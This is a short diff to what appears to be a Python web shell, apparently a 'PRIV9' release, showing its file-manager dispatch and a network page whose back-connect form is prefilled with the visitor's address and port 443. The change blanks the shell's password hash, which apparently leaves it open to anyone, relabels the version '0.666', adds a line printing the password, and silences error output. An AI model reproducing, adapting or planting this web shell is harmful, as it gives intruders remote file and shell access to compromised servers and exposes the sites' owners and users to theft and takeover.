@@ -4,8 +4,8 @@ from base64 import b64encode
 from stat import *
 from datetime import datetime
 sys.stderr = open(os.devnull, 'w')
-password = "78a28e78b897a2a8e9da425f683bbbb2"
-version = "0.5 [PRIV9]"
+password = ""
+version = "0.666"
 esc = '%s['%chr(27)
 color = esc + "1;36m"
 reset = esc + "0m"
@@ -580,7 +580,7 @@ def actionNetwork():
 	Server: <input type='text' name='server' value='"""+os.environ['REMOTE_ADDR']+"""'> Port: <input type='text' name='port' value='443'><input type=submit value=">>">
 	</form><br></div>"""
     printFooter()
-
+print password
 try:
     {
         'files' : actionFiles,
